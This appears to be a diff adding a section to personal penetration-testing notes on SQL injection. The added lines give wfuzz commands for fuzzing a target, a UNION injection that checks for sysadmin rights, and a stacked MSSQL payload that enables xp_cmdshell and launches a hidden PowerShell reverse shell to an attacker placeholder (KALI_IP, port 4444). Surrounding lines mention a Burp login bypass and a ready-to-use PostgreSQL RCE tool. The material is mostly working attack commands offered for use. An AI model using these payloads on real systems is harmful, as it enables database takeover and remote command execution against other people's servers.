@@ -215,6 +215,20 @@ It worked:
 
 Now, back to the proxy tab and turn off the interceptor, or send it into the response and try logging in in Burp; you should log in. But code 301 means it was successful. 
 
+## Union-based commands
+
+Fuzz first:
+```
+wfuzz -c -z range,1-20 "http://$target.com' ORDER BY FUZZ-- -"
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt --hc 404 "http://$target/search.php?query=FUZZ"
+```
+Then check for rights:
+```
+admin' UNION SELECT 1, is_srvrolemember('sysadmin')-- -
+```
+```
+' UNION SELECT 1, 2, 3; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('KALI_IP',4444)...'-- -
+```
 ## Great tools:
 https://github.com/squid22/PostgreSQL_RCE --> PostgreSQL RCE is already there, just change the ip address and port
 
